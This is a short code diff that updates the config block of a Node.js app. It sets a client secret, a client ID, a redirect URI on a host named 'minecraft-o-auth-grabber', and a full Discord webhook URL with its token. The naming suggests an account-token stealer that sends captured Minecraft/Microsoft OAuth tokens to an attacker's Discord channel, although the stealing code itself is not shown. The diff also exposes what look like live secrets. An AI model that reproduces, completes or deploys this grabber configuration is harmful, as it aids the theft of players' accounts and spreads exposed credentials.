@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const secret_value = 'RBWNYopgA3orvrH277F3SeK6cv3LenbP'
+const client_id = '1346501497701142579'
+const redirect_uri = 'minecraft-o-auth-grabber-mog-kohl.vercel.app'
+const webhook_url = 'https://discord.com/api/webhooks/1478400055936286972/JnQdOn_EcDtOqt5CJbi2aC9L6lBi0Em2wc4ObAcTQW1Uo1sTeDzCesbTIPdXAtKoLKcG'
 //Requirements
 const axios = require('axios')
 const express = require('express')
